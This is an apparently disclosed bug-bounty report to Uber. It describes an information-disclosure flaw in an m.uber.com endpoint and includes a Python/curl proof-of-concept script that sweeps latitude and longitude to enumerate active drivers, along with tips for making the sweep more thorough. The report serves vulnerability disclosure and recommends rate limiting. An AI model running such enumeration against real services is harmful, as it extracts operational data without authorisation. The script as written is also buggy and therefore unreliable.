@@ -1,0 +1,33 @@
+ReportLink:https://hackerone.com/reports/127025
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/ddworken
+ReportedTo:Uber(uber)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:13.06.2016 22:24:22
+
+Summary:
+
+m.uber.com has an endpoint at ```https://m.uber.com/proxy-rt/product/city/rider-view``` that when called will return a list of nearby vehicles. By iterating through all latitudes and longitudes, it is possible to count the total number of active Uber drivers. 
+
+The full URL to be called is ```https://m.uber.com/proxy-rt/product/city/rider-view?is-ride-now=false&latitude=[INSERT HERE]&longitude=[INSERT HERE]```. I used Google Chrome's "Copy as curl" function to generate the following PoC code: 
+
+``` python
+for lat in range(-180,180):
+    for long in range(-180,180):
+        try: t = json.loads(check_output("""curl 'https://m.uber.com/proxy-rt/product/city/rider-view?is-ride-now=false&latitude=""" + str(lat) + """&longitude=""" + str(long) + """' -H 'Cookie: logged_in=true; _LOCALE_=en_US; muber-id=[REDACTED]; version=[REDACTED]; browser_error=false; __zlcmid=ZvfRKEKucjdr2c; utag_main=v_id:[REDACTED]$_sn:9$_ss:0$_st:1459385284209$segment:a$userid:[REDACTED]$flowtype:P2P$_pn:6%3Bexp-session$ses_id:[REDACTED]%3Bexp-session; vehicle-view-id=326; token=[REDACTED]; new-version=[REDACTED]%0A; analytics-counter=65; analytics-session=%7B%22session_id%22%3A%227A84C14D-5FF6-[REDACTED]%22%2C%22session_start_time_ms%22%3A1459382073947%7D' -H 'X-Uber-Device-Language: en_US' -H 'DNT: 1' -H 'X-Uber-Token: [REDACTED]' -H 'X-Uber-Origin: m.uber.com' -H 'Accept-Encoding: gzip, deflate, sdch' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36' -H 'Accept-Language: en-US,en;q=0.8' -H 'Accept: */*' -H 'X-Uber-Device: m.uber.com' -H 'Referer: https://m.uber.com/' -H 'X-Requested-With: XMLHttpRequest' -H 'Connection: keep-alive' -H 'X-Uber-Device-Id: m.uber.com' --compressed""", shell=True))['vehicleViewsOrder']
+        except: pass
+        list += t
+print len(list(set(list)))
+``` 
+
+I ran through 1/360th of the above code (total of 360 requests) in approximately 6 minutes. This code can quite easily be optimized in order to increase the speed and efficiency through: 
+
+1. Checking only in areas where Uber is active
+2. Decreasing the size of the increment to ```.1``` instead of the current ```1``` to ensure we catch all Uber drivers
+
+In order to patch this you have to add rate limiting to this end point. 
+
+Thanks,
+David Dworken
